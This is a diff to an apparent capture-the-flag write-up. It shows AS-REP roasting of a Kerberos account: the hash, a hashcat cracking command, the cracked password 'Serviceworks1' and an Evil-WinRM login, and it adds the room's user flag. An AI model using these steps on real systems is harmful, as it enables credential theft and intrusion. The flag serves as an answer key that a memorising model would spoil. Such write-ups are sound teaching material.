@@ -168,15 +168,15 @@ $krb5asrep$23$j.rock@SERVICES.LOCAL:e10c9deff09d5d95e0e596a390c6bb67$521be42f3d1
 
 ```
 
-After successfully retrieved a hash, which can be cracked using Hashcat like so:
+After successfully retrieving a Kerberos hash, I was able to crack it using Hashcat with the following command:
 
 ```
 $ hashcat -m 18200 -a 0 -o hashes.txt /usr/share/wordlists/rockyou.txt -v 
 hashcat (v6.2.6) starting
 ```
-After using hashcat, I successfully managed to crack the hash. The password for the j.rock user is Serviceworks1
+Upon completing the cracking process, I discovered that the password for the user j.rock is Serviceworks1.
 
-Knowing this, I can then use evil-winrm to access the machine, like so:
+With this information, I used Evil-WinRM to gain access to the target machine by executing the following command:
 
 ```
 $ evil-winrm -i 10.10.17.164 -u 'j.rock' -p Serviceworks1 
@@ -189,6 +189,13 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\j.rock\Documents> 
+```
+
+Once logged in, I was able to retrieve the user flag:
+
+```
+*Evil-WinRM* PS C:\Users\j.rock\Desktop> type user.txt
+THM{ASr3p_R0aSt1n6}
 
 ```
 
